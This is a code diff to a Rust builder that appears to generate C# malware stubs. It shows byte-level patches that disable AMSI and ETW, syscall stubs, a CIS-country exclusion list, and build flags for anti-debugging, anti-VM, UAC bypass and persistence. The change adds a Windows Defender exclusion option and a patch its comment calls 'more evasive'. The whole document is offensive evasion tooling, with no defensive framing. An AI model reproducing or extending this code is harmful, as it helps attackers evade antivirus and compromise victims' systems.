@@ -65,7 +65,8 @@ impl MfStubCS {
         let seed_payload = self.potential_seeds[i];
         
         let mut cis_countries_list_bytes = vec![5, 7, 29, 130, 137, 152, 203, 228, 238, 247];
-        let mut amsi_patch_bytes = vec![144, 144, 144, 144, 144, 144, 144, 144, 49, 192, 195];
+        // Updated AMSI patch: 72, 49, 219 = "xor rbx, rbx" (more evasive, patches at offset +33)
+        let mut amsi_patch_bytes = vec![72, 49, 219];
         let mut etw_patch_bytes = vec![144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 195];
         let mut x64_syscall_stub_bytes = vec![76, 139, 209, 184, 0, 0, 0, 0, 73, 187, 0, 0, 0, 0, 0, 0, 0, 0, 65, 255, 227];
         let mut x86_syscall_stub_bytes = vec![184, 0, 0, 0, 0, 187, 0, 0, 0, 0, 255, 227];
@@ -190,7 +191,7 @@ impl MfStubCS {
     pub fn set_symbols(&mut self, build_config: &MfBuilder) {
         println!("{}{}", h(), "Modifying preprocessor symbols...".color(Color::Yellow));
         
-        let mut new_symbols = "NATIVE;ANTI_DEBUG;ANTI_VM;BLACKLIST_CIS;BYPASS_UAC;SINGLE_INSTANCE;PERSISTANCE;".to_string();
+        let mut new_symbols = "NATIVE;ANTI_DEBUG;ANTI_VM;BLACKLIST_CIS;BYPASS_UAC;SINGLE_INSTANCE;PERSISTANCE;DEFENDER_EXCLUSION;".to_string();
 
         if build_config.build_arch == BinaryArch::NET64 || build_config.build_arch == BinaryArch::NET86 {
             new_symbols = new_symbols.replace("NATIVE;", "");
@@ -213,16 +214,20 @@ impl MfStubCS {
         if !build_config.run_on_startup {
             new_symbols = new_symbols.replace("PERSISTANCE;", "");
         }
+        if !build_config.defender_exclusion {
+            new_symbols = new_symbols.replace("DEFENDER_EXCLUSION;", "");
+        }
         println!("{}{}{}", h(), "ANTI_DEBUG:          ".color(Color::Yellow), build_config.anti_debug.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
         println!("{}{}{}", h(), "ANTI_VM:             ".color(Color::Yellow), build_config.anti_virtual_machine.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
         println!("{}{}{}", h(), "BLACKLIST_CIS:       ".color(Color::Yellow), build_config.blacklist_cis_countries.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
         println!("{}{}{}", h(), "BYPASS_UAC:          ".color(Color::Yellow), build_config.uac_bypass.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
         println!("{}{}{}", h(), "SINGLE_INSTANCE:     ".color(Color::Yellow), build_config.single_instance.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
         println!("{}{}{}", h(), "PERSISTANCE:         ".color(Color::Yellow), build_config.run_on_startup.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
+        println!("{}{}{}", h(), "DEFENDER_EXCLUSION:  ".color(Color::Yellow), build_config.defender_exclusion.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
     
         let csproj_file_path = self.working_directory.clone() + "\\mfrunner.csproj";
         let mut csproj_file = fs::read_to_string(&csproj_file_path).unwrap();
-        csproj_file = csproj_file.replace("NATIVE;ANTI_DEBUG;ANTI_VM;BLACKLIST_CIS;BYPASS_UAC;SINGLE_INSTANCE;PERSISTANCE;", &new_symbols);
+        csproj_file = csproj_file.replace("NATIVE;ANTI_DEBUG;ANTI_VM;BLACKLIST_CIS;BYPASS_UAC;SINGLE_INSTANCE;PERSISTANCE;DEFENDER_EXCLUSION;", &new_symbols);
 
         fs::write(&csproj_file_path, csproj_file).unwrap();
         println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\MfRunner.csproj".color(Color::Blue));
